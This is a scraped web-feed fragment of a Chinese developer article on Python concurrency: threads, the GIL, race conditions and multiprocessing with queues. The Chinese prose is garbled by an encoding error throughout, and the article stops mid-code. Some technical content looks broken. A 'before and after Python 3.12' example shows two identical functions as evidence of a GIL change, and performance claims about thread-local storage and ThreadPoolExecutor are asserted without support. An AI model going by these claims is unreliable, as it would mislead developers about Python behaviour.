<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3974cb14e0074c37a3d0bd83fa55c3d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c5rC06LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770673&amp;x-signature=bbfN%2BUgw3eL0wNjsrw%2FvQ9NzNpM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">æœ€å</h3>
<p>ä¿®è¡Œä¹‹è·¯ï¼Œæ¥æ—¥ç›¸è§</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨å‡çº§Python 3.12ï¼Ÿçœ‹å®Œæˆ‘è¿å¤œé‡æ„äº†ä»£ç ]]></title>    <link>https://juejin.cn/post/7580683234437005375</link>    <guid>https://juejin.cn/post/7580683234437005375</guid>    <pubDate>2025-12-08T05:45:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580683234437005375" data-draft-id="7580616979473727494" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨å‡çº§Python 3.12ï¼Ÿçœ‹å®Œæˆ‘è¿å¤œé‡æ„äº†ä»£ç "/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T05:45:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·6854537597769"/> <meta itemprop="url" content="https://juejin.cn/user/1601315325621550"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨å‡çº§Python 3.12ï¼Ÿçœ‹å®Œæˆ‘è¿å¤œé‡æ„äº†ä»£ç 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1601315325621550/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·6854537597769
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:45:00.000Z" title="Mon Dec 08 2025 05:45:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸Šå‘¨ï¼Œæˆ‘ä»¬ç»„çš„ä»£ç reviewä¼šä¸Šï¼Œå°ç‹å†™äº†ä¸€è¡Œçœ‹ä¼¼æ™®é€šçš„ä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">url</span>):
    time.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿä¸‹è½½</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"ä¸‹è½½å®Œæˆ: <span class="hljs-subst">{url}</span>"</span>

<span class="hljs-comment"># æ¨¡æ‹Ÿä¸‹è½½10ä¸ªæ–‡ä»¶</span>
start_time = time.time()
threads = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
    thread = threading.Thread(target=download_file, args=(<span class="hljs-string">f"http://example.com/file<span class="hljs-subst">{i}</span>.jpg"</span>,))
    threads.append(thread)
    thread.start()

<span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:
    thread.join()

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"è€—æ—¶: <span class="hljs-subst">{time.time() - start_time}</span>ç§’"</span>)
</code></pre>
<p>è€å¤§çœ‹äº†ä¸‰ç§’ï¼Œè¯´äº†å¥ï¼š"ä½ çŸ¥é“è¿™è¡Œä»£ç åœ¨ç”Ÿäº§ç¯å¢ƒä¼šå‡ºä»€ä¹ˆé—®é¢˜å—ï¼Ÿ"</p>
<p>å°ç‹æ„£ä½äº†ã€‚æˆ‘ä¹Ÿæ„£ä½äº†ã€‚</p>
<p>"åŒæ ·æ˜¯10ä¸ªå¹¶å‘ä»»åŠ¡ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬ç”¨å¤šçº¿ç¨‹æ¯”éš”å£ç»„çš„Javaæ…¢äº†3å€ï¼Ÿè€å¤§ç»§ç»­è¿½é—®ã€‚"</p>
<p>ä¼šè®®å®¤é‡Œä¸€ç‰‡æ­»å¯‚ã€‚</p>
<p>é‚£ä¸€åˆ»æˆ‘æ„è¯†åˆ°ï¼Œæˆ‘ä»¬å¯¹Pythonå¹¶å‘çš„ç†è§£ï¼Œå¯èƒ½è¿˜åœç•™åœ¨ä¸‰å¹´å‰ã€‚</p>
<h2 data-id="heading-0">ä½ ä»¥ä¸ºçš„Pythonå¹¶å‘ vs å®é™…ä¸Šçš„Pythonå¹¶å‘</h2>
<p>å…ˆåšä¸ªå°æµ‹è¯•ï¼Œä½ è§‰å¾—ä¸‹é¢è¿™æ®µä»£ç ä¼šè¾“å‡ºä»€ä¹ˆï¼Ÿ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

counter = <span class="hljs-number">0</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">increment</span>():
    <span class="hljs-keyword">global</span> counter
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>):
        counter += <span class="hljs-number">1</span>

threads = []
<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
    t = threading.Thread(target=increment)
    threads.append(t)
    t.start()

<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()

<span class="hljs-built_in">print</span>(counter)  <span class="hljs-comment"># ä½ çŒœæ˜¯å‡ ï¼Ÿ</span>
</code></pre>
<p>å¦‚æœä½ è„±å£è€Œå‡º"200000"ï¼Œé‚£æ­å–œä½ ï¼Œå’Œ95%çš„ç¨‹åºå‘˜ä¸€æ ·ï¼Œéƒ½æ‰è¿›äº†åŒä¸€ä¸ªå‘é‡Œã€‚</p>
<p><strong>å®é™…è¾“å‡ºå¯èƒ½æ˜¯ï¼š137894ã€152677ã€æˆ–è€…å…¶ä»–ä»»ä½•å°äº200000çš„æ•°å­—ã€‚</strong></p>
<p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿè¿™å°±è¦æåˆ°Pythonå¹¶å‘ç¼–ç¨‹çš„ç¬¬ä¸€ä¸ªå¤§å‘ï¼š<strong>GILï¼ˆå…¨å±€è§£é‡Šå™¨é”ï¼‰</strong>ã€‚</p>
<h3 data-id="heading-1">GILï¼šPythonå¹¶å‘çš„"å¹½çµé”"</h3>
<p>æƒ³è±¡ä¸€ä¸‹ä½ åœ¨æ˜Ÿå·´å…‹æ’é˜Ÿä¹°å’–å•¡ï¼š</p>
<p><strong>å•çº¿ç¨‹æ¨¡å¼</strong>ï¼šåº—é‡Œåªæœ‰ä¸€ä¸ªå’–å•¡å¸ˆï¼Œé¡¾å®¢æ’æˆä¸€é˜Ÿï¼Œä¸€äººä¸€æ¯ï¼ŒæŒ‰é¡ºåºæ¥ã€‚</p>
<p><strong>ç†æƒ³çš„å¤šçº¿ç¨‹æ¨¡å¼</strong>ï¼šåº—é‡Œæœ‰å¤šä¸ªå’–å•¡å¸ˆï¼Œå¯ä»¥åŒæ—¶ç»™å¤šä¸ªé¡¾å®¢åšå’–å•¡ã€‚</p>
<p><strong>Pythonçš„å¤šçº¿ç¨‹æ¨¡å¼</strong>ï¼šåº—é‡Œæœ‰å¤šä¸ªå’–å•¡å¸ˆï¼Œä½†æ˜¯åªæœ‰ä¸€æŠŠå’–å•¡æœºã€‚å¤§å®¶è½®æµä½¿ç”¨å’–å•¡æœºï¼Œè™½ç„¶çœ‹èµ·æ¥å¾ˆå¿™ï¼Œä½†åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªäººåœ¨åšå’–å•¡ã€‚</p>
<p>è¿™å°±æ˜¯GILçš„æœ¬è´¨ï¼š<strong>åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æ‰§è¡ŒPythonå­—èŠ‚ç </strong>ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># çœ‹çœ‹è¿™ä¸ªä¾‹å­</span>
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_bound</span>():
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50_000_000</span>):
        count += i * i
    <span class="hljs-keyword">return</span> count

<span class="hljs-keyword">def</span> <span class="hljs-title function_">io_bound</span>():
    time.sleep(<span class="hljs-number">2</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç¡é†’äº†"</span>

<span class="hljs-comment"># CPUå¯†é›†å‹ä»»åŠ¡ - å¤šçº¿ç¨‹å¹¶ä¸èƒ½æå‡æ€§èƒ½</span>
start = time.time()
threads = [threading.Thread(target=cpu_bound) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.start()
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šçº¿ç¨‹CPUä»»åŠ¡è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)

<span class="hljs-comment"># I/Oå¯†é›†å‹ä»»åŠ¡ - å¤šçº¿ç¨‹å¯ä»¥æå‡æ€§èƒ½</span>
start = time.time()
threads = [threading.Thread(target=io_bound) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.start()
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šçº¿ç¨‹I/Oä»»åŠ¡è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)
</code></pre>
<p>è¿è¡Œç»“æœä¼šè®©ä½ æƒŠè®¶ï¼š</p>
<ul>
<li>å¤šçº¿ç¨‹CPUä»»åŠ¡è€—æ—¶ï¼šâ‰ˆ 8ç§’ï¼ˆå’Œå•çº¿ç¨‹å·®ä¸å¤šï¼ï¼‰</li>
<li>å¤šçº¿ç¨‹I/Oä»»åŠ¡è€—æ—¶ï¼šâ‰ˆ 2ç§’ï¼ˆæ¯”å•çº¿ç¨‹å¿«4å€ï¼ï¼‰</li>
</ul>
<p><strong>ç»“è®º</strong>ï¼šPythonå¤šçº¿ç¨‹åªé€‚åˆI/Oå¯†é›†å‹ä»»åŠ¡ï¼Œå¯¹CPUå¯†é›†å‹ä»»åŠ¡åŸºæœ¬æ²¡ç”¨ã€‚</p>
<h2 data-id="heading-2">Python 3.12çš„é‡å¤§æ›´æ–°ï¼šä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨å‡çº§</h2>
<p>å¦‚æœä½ è¿˜åœ¨ç”¨Python 3.11ç”šè‡³æ›´æ—©ç‰ˆæœ¬ï¼Œä½ å¯èƒ½ä¸çŸ¥é“Python 3.12åœ¨å¹¶å‘æ–¹é¢åšäº†é‡å¤§æ”¹è¿›ã€‚</p>
<h3 data-id="heading-3">1. æ›´æ™ºèƒ½çš„GILé‡Šæ”¾ç­–ç•¥</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.12ä¹‹å‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">old_thread_function</span>():
    <span class="hljs-comment"># å³ä½¿åœ¨ç­‰å¾…I/Oæ—¶ï¼Œä¹Ÿå¯èƒ½é•¿æ—¶é—´æŒæœ‰GIL</span>
    <span class="hljs-keyword">import</span> time
    time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># è¿™é‡Œçš„GILé‡Šæ”¾ä¸å¤ŸåŠæ—¶</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"å®Œæˆ"</span>

<span class="hljs-comment"># Python 3.12ä¼˜åŒ–å</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">new_thread_function</span>():
    <span class="hljs-comment"># æ›´æ™ºèƒ½çš„GILé‡Šæ”¾æ—¶æœº</span>
    <span class="hljs-keyword">import</span> time
    time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># GILé‡Šæ”¾æ›´åŠ åŠæ—¶</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"å®Œæˆ"</span>
</code></pre>
<p>è¿™ä¸ªæ”¹è¿›åœ¨çŸ­æ—¶é—´I/Oæ“ä½œä¸­ç‰¹åˆ«æ˜æ˜¾ï¼Œè®©ä½ çš„å¤šçº¿ç¨‹ä»£ç åœ¨Python 3.12ä¸‹è¿è¡Œå¾—æ›´å¿«ã€‚</p>
<h3 data-id="heading-4">2. çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆTLSï¼‰å¤§å¹…ä¼˜åŒ–</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.12çš„çº¿ç¨‹æœ¬åœ°å­˜å‚¨æ›´å¿«</span>
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># çº¿ç¨‹æœ¬åœ°æ•°æ®</span>
thread_local_data = threading.local()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>():
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(thread_local_data, <span class="hljs-string">'counter'</span>):
        thread_local_data.counter = <span class="hljs-number">0</span>
    thread_local_data.counter += <span class="hljs-number">1</span>

    <span class="hljs-comment"># åœ¨Python 3.12ä¸­ï¼Œè¿™ç§è®¿é—®æ¯”ä¹‹å‰ç‰ˆæœ¬å¿«30%+</span>
    <span class="hljs-keyword">return</span> thread_local_data.counter

threads = [threading.Thread(target=worker) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)]
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.start()
<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()
</code></pre>
<p>å¦‚æœä½ å¤§é‡ä½¿ç”¨çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼Œå‡çº§åˆ°Python 3.12ä¼šè·å¾—æ˜¾è‘—çš„æ€§èƒ½æå‡ã€‚</p>
<h3 data-id="heading-5">3. ThreadPoolExecutoræ€§èƒ½æå‡</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">x</span>):
    time.sleep(<span class="hljs-number">0.01</span>)
    <span class="hljs-keyword">return</span> x * x

<span class="hljs-comment"># Python 3.12ä¸­çš„ThreadPoolExecutoræœ‰æ›´å¥½çš„è°ƒåº¦ç®—æ³•</span>
<span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> executor:
    start = time.time()
    results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(task, <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)))
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Python 3.12è€—æ—¶: <span class="hljs-subst">{time.time() - start:<span class="hljs-number">.3</span>f}</span>ç§’"</span>)
</code></pre>
<p>Python 3.12å¯¹ThreadPoolExecutorçš„è°ƒåº¦ç®—æ³•è¿›è¡Œäº†ä¼˜åŒ–ï¼Œåœ¨å¤§é‡çŸ­ä»»åŠ¡åœºæ™¯ä¸‹æ€§èƒ½æå‡æ˜æ˜¾ã€‚</p>
<h2 data-id="heading-6">å¤šè¿›ç¨‹ï¼šCPUå¯†é›†å‹ä»»åŠ¡çš„æ•‘æ˜Ÿ</h2>
<p>æ—¢ç„¶å¤šçº¿ç¨‹åœ¨CPUå¯†é›†å‹ä»»åŠ¡ä¸Šä¸ç»™åŠ›ï¼Œé‚£æˆ‘ä»¬è¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ï¼š<strong>å¤šè¿›ç¨‹</strong>ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> threading

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_task</span>():
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25_000_000</span>):  <span class="hljs-comment"># å‡å°‘ä¸€ç‚¹é¿å…è·‘å¤ªä¹…</span>
        count += i * i
    <span class="hljs-keyword">return</span> count

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_task_with_threads</span>():
    <span class="hljs-string">"""å¤šçº¿ç¨‹ç‰ˆæœ¬ - åŸºæœ¬æ²¡æœ‰åŠ é€Ÿ"""</span>
    start = time.time()
    threads = [threading.Thread(target=cpu_task) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.start()
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.join()
    <span class="hljs-keyword">return</span> time.time() - start

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_task_with_processes</span>():
    <span class="hljs-string">"""å¤šè¿›ç¨‹ç‰ˆæœ¬ - çœŸæ­£çš„å¹¶è¡Œ"""</span>
    start = time.time()
    processes = [multiprocessing.Process(target=cpu_task) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:
        p.start()
    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:
        p.join()
    <span class="hljs-keyword">return</span> time.time() - start

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># å¿…é¡»è¦åŠ è¿™ä¸ªä¿æŠ¤ï¼</span>
    thread_time = cpu_task_with_threads()
    process_time = cpu_task_with_processes()

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šçº¿ç¨‹è€—æ—¶: <span class="hljs-subst">{thread_time:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šè¿›ç¨‹è€—æ—¶: <span class="hljs-subst">{process_time:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤šè¿›ç¨‹æ¯”å¤šçº¿ç¨‹å¿«äº† <span class="hljs-subst">{thread_time/process_time:<span class="hljs-number">.1</span>f}</span>å€"</span>)
</code></pre>
<p>åœ¨æˆ‘çš„ç”µè„‘ä¸Šè¿è¡Œç»“æœï¼š</p>
<ul>
<li>å¤šçº¿ç¨‹è€—æ—¶ï¼š7.89ç§’</li>
<li>å¤šè¿›ç¨‹è€—æ—¶ï¼š2.13ç§’</li>
<li>å¤šè¿›ç¨‹æ¯”å¤šçº¿ç¨‹å¿«äº†3.7å€ï¼</li>
</ul>
<h3 data-id="heading-7">ä¸ºä»€ä¹ˆå¤šè¿›ç¨‹èƒ½çªç ´GILé™åˆ¶ï¼Ÿ</h3>
<p>å› ä¸ºæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„Pythonè§£é‡Šå™¨å’ŒGILï¼Œæ‰€ä»¥å¯ä»¥çœŸæ­£åˆ©ç”¨å¤šæ ¸CPUã€‚</p>
<p><strong>å¤šè¿›ç¨‹å°±åƒæ˜¯å¼€äº†å‡ å®¶åˆ†åº—ï¼Œæ¯å®¶åº—éƒ½æœ‰è‡ªå·±çš„å’–å•¡å¸ˆå’Œå’–å•¡æœºã€‚</strong></p>
<h2 data-id="heading-8">è¿›ç¨‹é—´é€šä¿¡ï¼šå¤šè¿›ç¨‹çš„ç”œèœœè´Ÿæ‹…</h2>
<p>å¤šè¿›ç¨‹è™½ç„¶å¼ºå¤§ï¼Œä½†è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰æ˜¯ä¸ªå¤§é—®é¢˜ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œä¸åŒåº—é‡Œçš„å’–å•¡å¸ˆè¦å¦‚ä½•åä½œï¼Ÿ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">queue, result_queue</span>):
    <span class="hljs-string">"""å·¥ä½œè¿›ç¨‹ï¼šä»queueè·å–ä»»åŠ¡ï¼Œç»“æœæ”¾å…¥result_queue"""</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        task = queue.get()
        <span class="hljs-keyword">if</span> task == <span class="hljs-string">'DONE'</span>:
            <span class="hljs-keyword">break</span>
        result = task * task  <span class="hljs-comment"># è®¡ç®—å¹³æ–¹</span>
        result_queue.put(<span class="hljs-string">f"å¤„ç† <span class="hljs-subst">{task}</span>ï¼Œç»“æœ: <span class="hljs-subst">{result}</span>"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># åˆ›å»ºé˜Ÿåˆ—ç”¨äºè¿›ç¨‹é—´é€šä¿¡</span>
    task_queue = multiprocessing.Queue()
    result_queue = multiprocessing.Queue()

    <span class="hljs-comment"># å¯åŠ¨å·¥ä½œè¿›ç¨‹</span>
    processes = []
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
        p = multiprocessing.Process(target=worker, args=(task_queue, result_queue))
        p.start()
        processes.append(p)

    <span class="hljs-comment"># å‘é€ä»»åŠ¡</span>
    tasks = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>]
    <span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> tasks:
        task_queue.put(task)

    <span class="hljs-comment"># å‘é€ç»“æŸä¿¡å·</span>
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
        task_queue.put(<span class="hljs-string">'DONE'</span>)

    <span class="hljs-comment"># æ”¶é›†ç»“æœ</span>
    results = []
